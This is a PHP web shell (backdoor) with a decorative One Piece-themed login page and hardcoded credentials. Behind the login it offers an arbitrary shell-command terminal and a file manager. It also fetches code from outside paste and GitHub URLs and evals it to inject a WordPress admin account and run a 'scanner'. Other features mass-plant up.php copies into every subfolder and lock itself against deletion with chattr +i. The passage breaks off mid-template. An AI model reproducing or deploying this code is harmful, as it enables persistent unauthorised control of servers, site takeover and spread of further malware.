<?php
/**
 * ONE PIECE - ULTIMATE GRAND LINE EDITION (V7.0)
 * Features: Animated Sea, Flying Birds, Sailing Ships (Sunny & Merry)
 * Theme: Luxury Gold & Deep Emerald
 */

session_start();

// --- CONFIGURATION ---
$username_rahasia = "MalboroPutih"; 
$password_rahasia = "CumanYangKerasKerasAja8989@@"; 

$login_success = false;
$login_error = false;

if (isset($_POST['login'])) {
    if ($_POST['user'] == $username_rahasia && $_POST['pass'] == $password_rahasia) {
        $login_success = true;
        $_SESSION['op_auth_premium'] = true;
    } else {
        $login_error = true;
    }
}

if (!isset($_SESSION['op_auth_premium']) || $login_success) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THE GRAND LINE | VOYAGE ACCESS</title>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --gold: #d4af37;
            --emerald: rgba(0, 40, 30, 0.85);
            --ocean-dark: #002d4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to bottom, #001a2d 0%, #005f73 70%, #0a9396 100%);
            overflow: hidden;
            font-family: 'Montserrat', sans-serif;
        }

        /* --- CLOUDS --- */
        .clouds {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://www.transparenttextures.com/patterns/clouds.png');
            opacity: 0.2;
            animation: moveClouds 120s linear infinite;
            z-index: 1;
        }
        @keyframes moveClouds {
            from { background-position: 0 0; }
            to { background-position: 10000px 0; }
        }

        /* --- BIRDS --- */
        .bird {
            background-image: url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/174479/bird-cells-new.svg');
            background-size: auto 100%;
            width: 88px; height: 125px;
            animation: bird-flap 0.4s steps(10) infinite;
            position: absolute;
        }
        .bird-container {
            position: absolute;
            top: 15%; left: -10%;
            animation: bird-fly 25s linear infinite;
            transform: scale(0.35);
            z-index: 2;
        }
        @keyframes bird-flap { from { background-position: 0 0; } to { background-position: -900px 0; } }
        @keyframes bird-fly {
            0% { left: -10%; transform: scale(0.3) translateY(0); }
            50% { transform: scale(0.4) translateY(-30px); }
            100% { left: 110%; transform: scale(0.3) translateY(10px); }
        }

        /* --- SAILING SHIPS --- */
        .ship-container {
            position: absolute;
            bottom: 180px; /* Di atas air sedikit */
            width: 100%;
            height: 150px;
            z-index: 5; /* Di belakang ombak depan */
            pointer-events: none;
        }

        .ship {
            position: absolute;
            height: 120px;
            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3));
            animation: shipSailing 40s linear infinite, shipRocking 4s ease-in-out infinite;
        }

        /* Thousand Sunny */
        .sunny {
            left: -20%;
            animation-duration: 50s, 5s;
        }

        /* Going Merry */
        .merry {
            left: -30%;
            animation-delay: 15s, 0s;
            animation-duration: 60s, 6s;
            height: 90px;
            opacity: 0.9;
        }

        @keyframes shipSailing {
            0% { left: -20%; }
            100% { left: 110%; }
        }

        @keyframes shipRocking {
            0%, 100% { transform: rotate(-3deg) translateY(0); }
            50% { transform: rotate(3deg) translateY(-10px); }
        }

        /* --- LOGIN CARD --- */
        .login-card {
            position: relative;
            z-index: 100;
            width: 380px;
            padding: 50px 40px;
            background: var(--emerald);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(212, 175, 55, 0.4);
            border-radius: 30px;
            text-align: center;
            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
            animation: cardFloat 5s ease-in-out infinite;
        }
        @keyframes cardFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .op-logo {
            width: 240px;
            margin-bottom: 35px;
            filter: drop-shadow(0 0 15px var(--gold));
        }

        .input-box {
            position: relative;
            margin-bottom: 25px;
        }
        .input-box i {
            position: absolute;
            left: 15px; top: 50%;
            transform: translateY(-50%);
            color: var(--gold);
        }
        .input-box input {
            width: 100%;
            padding: 15px 15px 15px 45px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(212, 175, 55, 0.2);
            border-radius: 12px;
            color: #fff;
            outline: none;
            transition: 0.3s;
        }
        .input-box input:focus { border-color: var(--gold); background: rgba(255,255,255,0.1); }

        .btn-set-sail {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #a67c00, #d4af37, #f1c40f);
            border: none; border-radius: 12px;
            color: #000;
            font-family: 'Cinzel Decorative', cursive;
            font-weight: 900;
            font-size: 15px;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.4s;
            text-transform: uppercase;
        }
        .btn-set-sail:hover { transform: scale(1.03); box-shadow: 0 0 25px var(--gold); }

        /* --- OCEAN & WAVES --- */
        .ocean {
            width: 100%;
            height: 220px;
            position: absolute;
            bottom: 0; left: 0;
            background: var(--ocean-dark);
            z-index: 10;
        }
        .wave {
            background: url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/85486/wave.svg') repeat-x;
            position: absolute;
            top: -190px;
            width: 6400px;
            height: 198px;
            transform: translate3d(0, 0, 0);
        }
        .wave:nth-of-type(1) { animation: wave 12s linear infinite; opacity: 0.3; z-index: 9; }
        .wave:nth-of-type(2) { animation: wave 8s linear infinite; opacity: 0.5; z-index: 11; top: -170px; }
        .wave:nth-of-type(3) { animation: wave 5s linear infinite; opacity: 0.8; z-index: 12; top: -150px; }

        @keyframes wave {
            from { margin-left: 0; }
            to { margin-left: -1600px; }
        }

        .footer {
            margin-top: 35px;
            font-size: 9px;
            color: rgba(212, 175, 55, 0.6);
            letter-spacing: 3px;
        }

        #error { color: #ff4d4d; font-size: 11px; margin-bottom: 15px; font-weight: 700; display: <?php echo $login_error ? 'block' : 'none'; ?>; }
    </style>
</head>
<body>

    <div class="clouds"></div>

    <!-- Burung -->
    <div class="bird-container"><div class="bird"></div></div>
    <div class="bird-container" style="animation-delay: 8s; top: 30%;"><div class="bird"></div></div>

    <!-- Kapal Lewat -->
    <div class="ship-container">
        <!-- Thousand Sunny -->
        <img src="https://png.pngtree.com/png-vector/20240528/ourmid/pngtree-hand-drawn-fishirman-from-boat-on-transparent-background-png-image_12528307.png" class="ship sunny">
        <!-- Going Merry -->
        <img src="https://png.pngtree.com/png-vector/20220830/ourmid/pngtree-boat-fishing-silhouette-png-image_6130456.png" class="ship merry">
    </div>

    <!-- Card Login -->
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Logo_onepiece_2021.png" class="op-logo">
        
        <div id="error">⚠️ HAKI ANDA TIDAK TERDETEKSI!</div>

        <form method="POST">
            <div class="input-box">
                <i class="fas fa-skull"></i>
                <input type="text" name="user" placeholder="CAPTAIN NAME" required autocomplete="off">
            </div>
            <div class="input-box">
                <i class="fas fa-compass"></i>
                <input type="password" name="pass" placeholder="LOG POSE KEY" required>
            </div>
            <button type="submit" name="login" class="btn-set-sail">SET SAIL</button>
        </form>

        <div class="footer">THE NEW WORLD • EXECUTIVE ACCESS</div>
    </div>

    <!-- Laut (Ombak diletakkan di depan dan belakang kapal) -->
    <div class="ocean">
        <div class="wave"></div> <!-- Belakang Kapal -->
        <div class="wave"></div> <!-- Tengah -->
        <div class="wave"></div> <!-- Paling Depan -->
    </div>

    <script>
        <?php if($login_success): ?>
            document.querySelector('#error').innerHTML = "⚓ BERLAYAR KE LAUGH TALE...";
            document.querySelector('#error').style.color = "#00ffaa";
            document.querySelector('#error').style.display = "block";
            document.querySelector('form').style.display = 'none';
            setTimeout(() => { window.location.href = '?auth=granted'; }, 2000);
        <?php endif; ?>
    </script>

</body>
</html>
<?php
    exit;
}

// --- LANJUTAN SCRIPT ASLI ANDA ---
error_reporting(0); 
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');

$current = isset($_GET['path']) ? $_GET['path'] : getcwd();
$currentPath = realpath($current) ?: realpath(getcwd());
$os_type = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? "Windows" : "Linux";
$self = basename($_SERVER['PHP_SELF']);
$shell_home = dirname(realpath(__FILE__));

// Timeout untuk file_get_contents
$ctx = stream_context_create(['http' => ['timeout' => 15]]);

/**
 * HELPER: Eksekusi Perintah dengan Fallback
 */
function safe_exec($cmd) {
    $cmd = $cmd . " 2>&1";
    if (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    }
    return "FAILED: Semua fungsi eksekusi dinonaktifkan.";
}

$exec_enabled = (function_exists('shell_exec') || function_exists('exec') || function_exists('system') || function_exists('passthru'));

// --- MASS AUTO CREATE FILE LOGIC (IN EVERY FOLDER) ---
if (isset($_GET['auto_create'])) {
    $remote_url = "https://bestpaste.dev/raw/RS0lUmaBpX";
    $content = @file_get_contents($remote_url, false, $ctx);
    $injected_count = 0;

    // --- ADDED: Setup logging ---
    $log_file = $shell_home . DIRECTORY_SEPARATOR . "sebar.txt";
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $base_url = $protocol . $_SERVER['HTTP_HOST'];
    // ----------------------------

    if ($content) {
        // Injeksi ke folder saat ini
        $path_now = $currentPath . DIRECTORY_SEPARATOR . "up.php";
        if (@file_put_contents($path_now, $content)) {
            $injected_count++;
            // --- ADDED: Simpan link ke sebar.txt ---
            $link = $base_url . str_replace($_SERVER['DOCUMENT_ROOT'], '', $path_now);
            @file_put_contents($log_file, $link . PHP_EOL, FILE_APPEND);
            // --------------------------------------
        }

        // Scan semua item di folder saat ini
        $scan_items = scandir($currentPath);
        foreach ($scan_items as $item) {
            if ($item != "." && $item != "..") {
                $target_dir = $currentPath . DIRECTORY_SEPARATOR . $item;
                // Jika itu adalah folder, masukkan file up.php
                if (is_dir($target_dir)) {
                    $sub_path = $target_dir . DIRECTORY_SEPARATOR . "up.php";
                    if (@file_put_contents($sub_path, $content)) {
                        $injected_count++;
                        // --- ADDED: Simpan link ke sebar.txt ---
                        $link = $base_url . str_replace($_SERVER['DOCUMENT_ROOT'], '', $sub_path);
                        @file_put_contents($log_file, $link . PHP_EOL, FILE_APPEND);
                        // --------------------------------------
                    }
                }
            }
        }
        $msg = "Success: Injected into $injected_count folders! Result saved to sebar.txt";
    } else {
        $msg = "Error: Could not fetch content from remote URL.";
    }
    header("Location: ?path=" . urlencode($currentPath) . "&msg=" . urlencode($msg));
    exit;
}

// --- ANTI-DELETE (IMMORTAL) LOGIC ---
$immortal_msg = "";
if (isset($_GET['activate_immortal'])) {
    $file = __FILE__;
    @chmod($file, 0444); 
    if ($os_type === "Linux") {
        $res = safe_exec("chattr +i " . escapeshellarg($file));
        $immortal_msg = (strpos($res, 'FAILED') !== false) ? "Warning: chattr failed." : "Immortal Activated";
    } else { $immortal_msg = "Immortal Mode only works on Linux."; }
    header("Location: ?path=" . urlencode($currentPath) . "&msg=" . urlencode($immortal_msg));
    exit;
}

if (isset($_GET['disable_immortal'])) {
    @chmod(__FILE__, 0644);
    if ($os_type === "Linux") { safe_exec("chattr -i " . escapeshellarg(__FILE__)); }
    header("Location: ?path=" . urlencode($currentPath) . "&msg=Immortal+Disabled");
    exit;
}

if (isset($_GET['msg'])) $immortal_msg = htmlspecialchars($_GET['msg']);

// --- WP INJECTOR LOGIC ---
$wp_msg = "";
if (isset($_POST['wp_user_create'])) {
    $remote_wp = "https://raw.githubusercontent.com/stevenrehmand/remote/refs/heads/main/user_logics11.txt";
    $logic = @file_get_contents($remote_wp, false, $ctx);
    if ($logic) { 
        ob_start();
        @eval('?>' . $logic); 
        $wp_msg = "Injection Process Completed.";
        ob_end_clean();
    } else { $wp_msg = "ERROR: Connection failed."; }
}

// --- SCANNER LOGIC ---
$scan_result = "";
if (isset($_POST['run_scanner'])) {
    $remote_scan = "https://raw.githubusercontent.com/stevenrehmand/remote/refs/heads/main/pintuDor_logic.txt";
    $logic = @file_get_contents($remote_scan, false, $ctx);
    if ($logic) { 
        ob_start();
        @eval('?>' . $logic); 
        $scan_result = ob_get_clean(); 
        if(empty($scan_result)) $scan_result = "Scan completed, but no vulnerabilities found.";
    } else { $scan_result = "ERROR: Failed to connect to scanner server."; }
}

// --- TERMINAL HANDLER ---
if (isset($_POST['terminal_command'])) {
    chdir($currentPath); 
    $output = safe_exec($_POST['terminal_command']);
    echo $output ? htmlspecialchars($output) : "Command executed (No output).";
    exit;
}

// --- HELPERS ---
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    return number_format($bytes / 1024, 2) . ' KB';
}
function getFullPerms($p) {
    if (!file_exists($p)) return "???";
    return substr(sprintf('%o', fileperms($p)), -4);
}
function rmDirRec($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!rmDirRec($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// --- FILE ACTIONS ---
if (isset($_GET['delete'])) { 
    if ($_GET['delete'] != $self) { rmDirRec($currentPath . DIRECTORY_SEPARATOR . $_GET['delete']); }
    header("Location: ?path=".urlencode($currentPath)); exit;
}
if (isset($_GET['download'])) {
    $f = $currentPath . DIRECTORY_SEPARATOR . $_GET['download'];
    if (file_exists($f)) { 
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="'.basename($f).'"'); 
        readfile($f); exit; 
    }
}
if (isset($_POST['new_item_name'])) {
    $t = $currentPath.DIRECTORY_SEPARATOR.$_POST['new_item_name'];
    $_POST['type'] == 'folder' ? @mkdir($t) : @file_put_contents($t, '');
    header("Location: ?path=".urlencode($currentPath)); exit;
}
if (isset($_FILES['upload_file'])) {
    foreach ($_FILES['upload_file']['name'] as $i => $name) {
        @move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $currentPath.DIRECTORY_SEPARATOR.$name);
    }
    header("Location: ?path=".urlencode($currentPath)); exit;
}
if (isset($_POST['edit_content'])) { 
    @file_put_contents($currentPath.DIRECTORY_SEPARATOR.$_POST['filename'], $_POST['edit_content']); 
    header("Location: ?path=".urlencode($currentPath)); exit; 
}
if (isset($_POST['rename_old'])) { 
    @rename($currentPath.DIRECTORY_SEPARATOR.$_POST['rename_old'], $currentPath.DIRECTORY_SEPARATOR.$_POST['rename_new']); 
    header("Location: ?path=".urlencode($currentPath)); exit; 
}

$items = @scandir($currentPath) ?: [];
$folders = []; $files = [];
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    is_dir($currentPath.DIRECTORY_SEPARATOR.$i) ? $folders[] = $i : $files[] = $i;
}
natcasesort($folders); natcasesort($files);
$sortedItems = array_merge($folders, $files);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Mr. Newbie | Zoro Executive Shell</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Inter:wght@400;600&family=Fira+Code&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: #050508; 
            --panel: rgba(15, 51, 33, 0.14); 
            --accent: #198754; 
            --border: rgba(46, 204, 113, 0.3); 
            --text: #e2e8f0; 
            --success: #2ecc71; 
            --gold: #f1c40f; 
            --danger: #e74c3c; 
        }
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter', sans-serif; }
        body { 
            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), 
                        url('https://moewalls.com/wp-content/uploads/2026/03/zoro-the-king-of-hell-one-piece-thumb.jpg') fixed center center;
            background-size: cover; color: var(--text); font-size: 13px; min-height: 100vh; overflow-x: hidden;
        }

        /* --- DECORATION LOGOS --- */
        .decor-op { position: absolute; top: 0px; left: 15px; width: 130px; z-index: 1001; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); }
        .decor-sword { position: absolute; top: 10px; right: 15px; width: 100px; z-index: 1001; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); transform: rotate(-10deg); }

        .logo-container { text-align: center; padding: 30px 0; background: rgba(0,0,0,0.6); border-bottom: 3px solid var(--accent); position: relative; }
        .logo-text { 
    font-family: 'Bangers', cursive; 
    font-size: 55px; 
    color: #fff; /* Warna dasar putih agar efek neon lebih masuk */
    text-shadow: 
        0 0 7px #fff,
        0 0 10px #fff,
        0 0 21px #fff,
        0 0 42px var(--success),
        0 0 82px var(--success),
        0 0 92px var(--success),
        0 0 102px var(--success),
        0 0 151px var(--success);
    letter-spacing: 4px; 
    animation: neon-flicker 1.5s infinite alternate; /* Menambahkan animasi */
}

@keyframes neon-flicker {
    0%, 18%, 22%, 25%, 53%, 57%, 100% {
        text-shadow:
            0 0 4px #fff,
            0 0 11px #fff,
            0 0 19px #fff,
            0 0 40px var(--success),
            0 0 80px var(--success),
            0 0 90px var(--success),
            0 0 100px var(--success),
            0 0 150px var(--success);
        color: #fff;
    }
    20%, 24%, 55% {        
        text-shadow: none;
        color: rgba(46, 204, 113, 0.3); /* Warna meredup saat "mati" */
    }
}
        .logo-sub { font-size: 13px; text-transform: uppercase; letter-spacing: 7px; color: #fff; margin-top: -5px; opacity: 0.9; }
        
        .sticky-header { position: sticky; top: 0; z-index: 1000; background: rgba(5, 15, 10, 0.95); padding: 15px 25px; border-bottom: 1px solid var(--border); backdrop-filter: blur(10px); }
        .info-grid { display: flex; justify-content: space-between; background: rgba(0,0,0,0.5); padding: 12px 15px; border-radius: 4px; border: 1px solid var(--border); margin-bottom: 15px; border-left: 5px solid var(--success); }
        .pwd-bar { background: rgba(0,0,0,0.7); padding: 10px 15px; border-radius: 4px; border: 1px solid var(--border); margin-bottom: 15px; color: var(--success); font-family: 'Fira Code'; font-weight: bold; border-left: 5px solid var(--gold); }
        .pwd-link { color: var(--success); text-decoration: none; }
        .pwd-link:hover { color: #fff; text-shadow: 0 0 8px var(--success); }
        
        .toolbar { display: flex; gap: 8px; flex-wrap: wrap; }
        .btn { padding: 9px 16px; border-radius: 4px; border: 1px solid var(--border); background: rgba(13, 13, 21, 0.8); color: #fff; cursor: pointer; font-size: 11px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; transition: 0.3s; }
        .btn:hover { background: var(--accent); transform: translateY(-2px); box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); }
        
        .main-content { padding: 25px; }
        table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
        th { text-align: left; padding: 15px; background: rgba(0,0,0,0.8); color: var(--success); font-size: 11px; text-transform: uppercase; }
        td { padding: 12px 15px; border-bottom: 1px solid rgba(25, 135, 84, 0.1); }
        tr:hover { background: rgba(46, 204, 113, 0.1); }
        
        .file-name { display: flex; align-items: center; gap: 10px; color: #fff; text-decoration: none; font-weight: 500; }
        .mini-btn { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 4px; color: #fff; text-decoration: none; transition: 0.2s; }
        .mini-btn:hover { background: var(--success); color: #000; border-color: #fff; }

        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.92); display: none; align-items: center; justify-content: center; z-index: 3000; backdrop-filter: blur(5px); }
        .modal.active { display: flex; }
        .modal-box { background: #0a1510; border: 2px solid var(--success); width: 500px; padding: 30px; border-radius: 8px; box-shadow: 0 0 40px rgba(46, 204, 113, 0.3); }
        
        textarea { width: 100%; height: 450px; background: #000; color: var(--success); border: 1px solid var(--border); padding: 15px; font-family: 'Fira Code'; resize: none; outline: none; border-radius: 4px; margin-top: 10px; }
        .input-text { width: 100%; padding: 12px; background: #000; border: 1px solid var(--border); color: #fff; margin: 10px 0; border-radius: 4px; outline: none; }
        
        #contextMenu { position: absolute; background: #0a1510; border: 1px solid var(--success); border-radius: 4px; padding: 5px 0; width: 180px; display: none; z-index: 2000; }
        .cm-item { padding: 10px 15px; color: #fff; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 10px; }
        .cm-item:hover { background: var(--accent); }
        
        .scan-container { background: #000; border: 1px solid var(--success); padding: 20px; border-radius: 8px; margin-bottom: 25px; max-height: 400px; overflow-y: auto; font-family: 'Fira Code'; color: var(--success); }
    </style>
</head>
<body>

    <div class="sticky-header">

    

    <div class="logo-container">
        <div class="logo-text">MR. NEWBIE</div>
        <img src="https://cdn3.emoji.gg/emojis/29821-zoro.png" class="decor-sword" alt="Zoro Swords">
        <div class="logo-sub">Akses Khusus Yang Keras Aja</div>
    </div>
        <div class="info-grid">
            <div><span style="color:var(--success)"><i class="fas fa-microchip"></i> OS:</span> <?= substr(php_uname(),0,60) ?>...</div>
            <div>
                <span style="color:var(--success)"><i class="fab fa-php"></i> PHP:</span> <?= phpversion() ?> 
                <span style="margin-left:15px; color:<?= $exec_enabled ? 'var(--success)' : 'var(--danger)' ?>">
                    EXEC: <?= $exec_enabled ? 'ON' : 'OFF' ?>
                </span>
            </div>
        </div>

        <div class="pwd-bar">
            <i class="fas fa-compass"></i> PATH: 
            <?php 
                $pathParts = explode(DIRECTORY_SEPARATOR, $currentPath); $accPath = "";
                foreach ($pathParts as $index => $part) {
                    if ($part === "" && $index === 0) { $accPath = "/"; echo "<a href='?path=".urlencode($accPath)."' class='pwd-link'>/</a>"; continue; }
                    if ($part === "") continue;
                    $accPath .= ($os_type == "Windows" && $accPath == "") ? $part : DIRECTORY_SEPARATOR . $part;
                    echo "<a href='?path=".urlencode($accPath)."' class='pwd-link'>$part</a> <span style='color:var(--border)'>/</span> ";
                }
            ?>
        </div>

        <div class="toolbar">
            <a href="?path=<?= urlencode($shell_home) ?>" class="btn" style="border-color:var(--gold); color:var(--gold);"><i class="fas fa-house-user"></i> Home Shell</a>
            <button class="btn" onclick="document.getElementById('up').click()"><i class="fas fa-upload"></i> Upload</button>
            <form action="" method="POST" enctype="multipart/form-data" id="upform" style="display:none"><input type="file" name="upload_file[]" id="up" multiple onchange="document.getElementById('upform').submit()"></form>
            <button class="btn" onclick="openM('mFolder')"><i class="fas fa-folder-plus"></i> Folder</button>
            <button class="btn" onclick="openM('mFile')"><i class="fas fa-file-code"></i> File</button>
            <button class="btn" style="border-color:var(--gold); color:var(--gold);" onclick="toggleTerminal()"><i class="fas fa-terminal"></i> Terminal</button>
            <button class="btn" style="border-color:#21759b; color:#40a9ff;" onclick="openM('mWP')"><i class="fab fa-wordpress"></i> WP Inject</button>
            <button class="btn" style="border-color:var(--success); color:var(--success);" onclick="openM('mScanner')"><i class="fas fa-shield-virus"></i> Scanner</button>
            <a href="?path=<?= urlencode($currentPath) ?>&activate_immortal=1" class="btn" style="border-color:#ff0055; color:#ff0055;"><i class="fas fa-ghost"></i> Immortal</a>
            <a href="?path=<?= urlencode($currentPath) ?>&auto_create=1" class="btn" style="border-color:cyan; color:cyan;" title="Inject up.php to all subfolders"><i class="fas fa-magic"></i> Mass Auto Inject</a>
        </div>
    </div>

    <div class="main-content">
        <?php if($immortal_msg): ?><div style="background:var(--accent); color:#fff; padding:12px; margin-bottom:15px; border-radius:4px; border-left: 5px solid var(--gold);"><?= $immortal_msg ?></div><?php endif; ?>
        <?php if($wp_msg): ?><div style="background:rgba(33,117,155,0.8); color:#fff; padding:12px; margin-bottom:15px; border-radius:4px;"><?= $wp_msg ?></div><?php endif; ?>
        
        <?php if($scan_result): ?>
        <div class="scan-container">
            <h3 style="color:var(--gold); margin-bottom:10px;"><i class="fas fa-poll"></i> Scan Results:</h3>
            <div><?= $scan_result ?></div>
        </div>
        <?php endif; ?>
        
        <table>
            <thead>
                <tr>
                    <th width="40"><input type="checkbox"></th>
                    <th>Name</th><th width="120">Size</th><th width="100">Perms</th><th width="180" style="text-align:right">Actions</th>
                </tr>
            </thead>
            <tbody>
                <tr><td></td><td><a href="?path=<?= urlencode(dirname($currentPath)) ?>" class="file-name" style="color:var(--gold);"><i class="fas fa-level-up-alt"></i> .. / Parent Directory</a></td><td></td><td></td><td></td></tr>
                <?php foreach($sortedItems as $item): 
                    $f = $currentPath.DIRECTORY_SEPARATOR.$item; $isD = is_dir($f); 
                ?>
                <tr class="file-row" data-name="<?= $item ?>" data-isdir="<?= $isD?'1':'0' ?>">
                    <td style="text-align:center"><input type="checkbox" class="file-check"></td>
                    <td><a href="<?= $isD ? '?path='.urlencode($f) : 'javascript:void(0)' ?>" class="file-name"><i class="fas <?= $isD?'fa-folder':'fa-file-alt' ?>" style="color:<?= $isD?'var(--success)':'#82aaff' ?>;"></i><?= $item ?></a></td>
                    <td style="color:#94a3b8; font-size:11px;"><?= $isD ? 'DIR' : formatSize(@filesize($f)) ?></td>
                    <td style="color:var(--success); font-family:'Fira Code';"><?= getFullPerms($f) ?></td>
                    <td>
                        <div style="display:flex; gap:5px; justify-content:flex-end;">
                            <?php if(!$isD): ?>
                                <a href="?path=<?= urlencode($currentPath) ?>&download=<?= urlencode($item) ?>" class="mini-btn"><i class="fas fa-download"></i></a>
                                <a href="?path=<?= urlencode($currentPath) ?>&edit=<?= urlencode($item) ?>" class="mini-btn"><i class="fas fa-edit"></i></a>
                            <?php endif; ?>
                            <button onclick="trigR('<?= $item ?>')" class="mini-btn"><i class="fas fa-i-cursor"></i></button>
                            <button onclick="trigD('<?= $item ?>')" class="mini-btn" style="color:var(--danger)"><i class="fas fa-trash"></i></button>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <!-- MODALS -->
    <div id="mWP" class="modal"><div class="modal-box"><h3>WP Injector</h3><form method="POST"><input type="hidden" name="wp_user_create" value="1"><input type="text" name="wp_user" class="input-text" placeholder="Username" required><input type="password" name="wp_pass" class="input-text" placeholder="Password" required><button type="submit" class="btn" style="width:100%; background:var(--accent);">Inject Admin</button><button type="button" onclick="closeM('mWP')" class="btn" style="width:100%; margin-top:5px;">Cancel</button></form></div></div>
    <div id="mScanner" class="modal"><div class="modal-box"><h3>Shell Scanner</h3><p style="margin-bottom:15px; color:#94a3b8;">Mulai pemindaian mendalam pada direktori ini.</p><form method="POST"><input type="hidden" name="run_scanner" value="1"><button type="submit" class="btn" style="width:100%; background:var(--success); color:#000; font-weight:bold;">Run Deep Scan</button><button type="button" onclick="closeM('mScanner')" class="btn" style="width:100%; margin-top:5px;">Cancel</button></form></div></div>
    <div id="mFolder" class="modal"><div class="modal-box"><h3>New Folder</h3><form method="POST"><input type="hidden" name="type" value="folder"><input type="text" name="new_item_name" class="input-text" required placeholder="Folder Name"><button type="submit" class="btn">Create</button><button type="button" onclick="closeM('mFolder')" class="btn">Cancel</button></form></div></div>
    <div id="mFile" class="modal"><div class="modal-box"><h3>New File</h3><form method="POST"><input type="hidden" name="type" value="file"><input type="text" name="new_item_name" class="input-text" required placeholder="filename.php"><button type="submit" class="btn">Create</button><button type="button" onclick="closeM('mFile')" class="btn">Cancel</button></form></div></div>
    <div id="mRename" class="modal"><div class="modal-box"><h3>Rename</h3><form method="POST"><input type="hidden" name="rename_old" id="rOld"><input type="text" name="rename_new" id="rNew" class="input-text" required><button type="submit" class="btn">Apply</button><button type="button" onclick="closeM('mRename')" class="btn">Cancel</button></form></div></div>

    <div id="terminalModal" class="modal">
        <div class="term-box" style="width:85%; height:75%; background:#000; border:2px solid var(--success); border-radius:8px; display:flex; flex-direction:column; overflow:hidden;">
            <div style="background:#0a1510; padding:12px; display:flex; justify-content:space-between; border-bottom:1px solid var(--success);"><span style="color:var(--success); font-weight:bold;"><i class="fas fa-terminal"></i> ZORO TERMINAL</span><i class="fas fa-times-circle" onclick="toggleTerminal()" style="cursor:pointer; color:var(--danger); font-size:20px;"></i></div>
            <div id="termOutput" style="flex:1; padding:15px; overflow-y:auto; color:var(--success); font-family:'Fira Code'; font-size:13px; white-space:pre-wrap;">Mr. Newbie Terminal Ready...<br></div>
            <div style="background:#000; padding:10px 15px; border-top:1px solid #222; display:flex; align-items:center;"><span style="color:var(--success); margin-right:10px;">[ZORO@SHELL]#</span><input type="text" id="termInput" style="background:transparent; border:none; outline:none; color:#fff; flex:1; font-family:'Fira Code';" autofocus autocomplete="off"></div>
        </div>
    </div>

    <div id="contextMenu">
        <div class="cm-item" id="cmEdit"><i class="fas fa-edit"></i> Edit</div>
        <div class="cm-item" id="cmDownload"><i class="fas fa-download"></i> Download</div>
        <div class="cm-item" id="cmRename"><i class="fas fa-i-cursor"></i> Rename</div>
        <div class="cm-item" id="cmDelete" style="color:var(--danger)"><i class="fas fa-trash"></i> Delete</div>
    </div>

    <?php if(isset($_GET['edit'])): 
        $ef = $currentPath.DIRECTORY_SEPARATOR.$_GET['edit']; 
        $cont = file_exists($ef) ? htmlspecialchars(file_get_contents($ef)) : "";
    ?>
    <div class="modal active"><div class="modal-box" style="width:90%; max-width:1100px;"><h3>Editing: <?= htmlspecialchars($_GET['edit']) ?></h3><form method="POST"><input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['edit']) ?>"><textarea name="edit_content"><?= $cont ?></textarea><div style="margin-top:15px; display:flex; gap:10px;"><button type="submit" class="btn" style="background:var(--success); color:#000; font-weight:bold; border:none;">Save Changes</button> <a href="?path=<?= urlencode($currentPath) ?>" class="btn">Discard</a></div></form></div></div>
